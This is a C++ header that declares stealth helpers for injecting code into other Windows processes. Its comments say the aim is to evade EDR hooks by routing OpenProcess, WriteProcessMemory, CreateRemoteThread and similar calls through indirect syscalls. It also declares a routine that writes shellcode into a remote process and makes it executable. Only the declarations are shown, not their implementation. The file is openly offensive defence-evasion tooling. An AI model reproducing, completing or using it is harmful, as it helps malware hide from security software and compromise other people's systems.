#pragma once

/**
 * vh/inject_stealth.vh — Shared indirect-syscall helpers for injection
 *
 * Provides drop-in replacements for the Win32 APIs that EDR hooks most
 * aggressively.  Every function routes through vh::syscalls (indirect mode)
 * so the syscall instruction executes at an ntdll gadget address.
 *
 * Injection source files include this header and call vh_* helpers instead
 * of the Win32 originals.  This centralizes the stealth plumbing so that
 * individual injection techniques don't each need their own NT resolution.
 *
 * Replaced Win32 → indirect-syscall mapping:
 *
 *   OpenProcess           → vh_open_process
 *   VirtualAllocEx        → vh_alloc_remote
 *   WriteProcessMemory    → vh_write_remote
 *   ReadProcessMemory     → vh_read_remote
 *   VirtualFreeEx         → vh_free_remote
 *   VirtualProtectEx      → vh_protect_remote
 *   CreateRemoteThread    → vh_create_thread
 *   OpenThread            → vh_open_thread
 *   CloseHandle           → vh_close
 *   CreateToolhelp32Snap  → vh_find_thread (NtQuerySystemInformation)
 *   NtQueueApcThread      → vh_queue_apc
 */

#include <vanhooks/vanhooks.vh>
#include <cstdint>
#include <span>

#if defined(_WIN32)

#ifndef WIN32_LEAN_AND_MEAN
#  define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>

namespace vh::inject_stealth {

/// Open a process via NtOpenProcess (indirect syscall).
/// Drop-in replacement for OpenProcess().
[[nodiscard]] HANDLE vh_open_process(DWORD pid, ACCESS_MASK access = PROCESS_ALL_ACCESS) noexcept;

/// Allocate memory in a remote process via NtAllocateVirtualMemory (indirect).
/// Drop-in replacement for VirtualAllocEx().
[[nodiscard]] void* vh_alloc_remote(HANDLE proc, void* preferred, SIZE_T size,
                                    DWORD type = MEM_COMMIT | MEM_RESERVE,
                                    DWORD protect = PAGE_READWRITE) noexcept;

/// Write to remote process memory via NtWriteVirtualMemory (indirect).
/// Drop-in replacement for WriteProcessMemory().
bool vh_write_remote(HANDLE proc, void* remote, const void* local,
                     SIZE_T size, SIZE_T* written = nullptr) noexcept;

/// Read from remote process memory via NtReadVirtualMemory (indirect).
/// Drop-in replacement for ReadProcessMemory().
[[nodiscard]] bool vh_read_remote(HANDLE proc, const void* remote, void* local,
                                  SIZE_T size, SIZE_T* read_count = nullptr) noexcept;

/// Free remote memory via NtFreeVirtualMemory (indirect).
/// Drop-in replacement for VirtualFreeEx().
bool vh_free_remote(HANDLE proc, void* base, SIZE_T size = 0,
                    DWORD type = MEM_RELEASE) noexcept;

/// Change remote memory protection via NtProtectVirtualMemory (indirect).
/// Drop-in replacement for VirtualProtectEx().
bool vh_protect_remote(HANDLE proc, void* base, SIZE_T size,
                       DWORD new_prot, DWORD* old_prot) noexcept;

/// Create a remote thread via NtCreateThreadEx (indirect).
/// Drop-in replacement for CreateRemoteThread().
[[nodiscard]] HANDLE vh_create_thread(HANDLE proc, void* start, void* param = nullptr,
                                      bool suspended = false) noexcept;

/// Open a thread via NtOpenThread (indirect).
/// Drop-in replacement for OpenThread().
[[nodiscard]] HANDLE vh_open_thread(DWORD tid, ACCESS_MASK access) noexcept;

/// Close a handle via NtClose (indirect).
/// Drop-in replacement for CloseHandle().
void vh_close(HANDLE h) noexcept;

/// Find the first thread in a process via NtQuerySystemInformation (indirect).
/// Drop-in replacement for CreateToolhelp32Snapshot + Thread32First.
[[nodiscard]] DWORD vh_find_thread(DWORD pid) noexcept;

/// Queue an APC to a thread via NtQueueApcThread (indirect).
bool vh_queue_apc(HANDLE thread, void* apc_routine,
                  void* arg1 = nullptr, void* arg2 = nullptr,
                  void* arg3 = nullptr) noexcept;

/// Write shellcode: alloc RW → write → flip to RX (no RWX ever exists).
/// Combines vh_alloc_remote + vh_write_remote + vh_protect_remote.
struct RemoteAlloc {
    void*  base = nullptr;
    SIZE_T size = 0;
};
[[nodiscard]] RemoteAlloc vh_write_shellcode(HANDLE proc,
                                             std::span<const std::uint8_t> code) noexcept;

} // namespace vh::inject_stealth

#endif // _WIN32

